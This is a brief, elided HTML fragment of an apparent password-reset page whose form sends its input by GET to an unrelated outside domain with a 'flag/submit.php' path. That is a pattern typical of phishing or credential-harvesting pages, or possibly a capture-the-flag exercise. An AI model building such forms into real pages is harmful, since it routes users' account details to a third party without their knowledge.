...
<div id="global-error">
  ...
  <div class="request-password-reset flow-login">
        ...
        <form action="https://leatherfabriccollection.com/app/flag/submit.php" method="GET" name="requestPasswordReset" novalidate="novalidate" class="flow-login-form" id="PWResetForm">
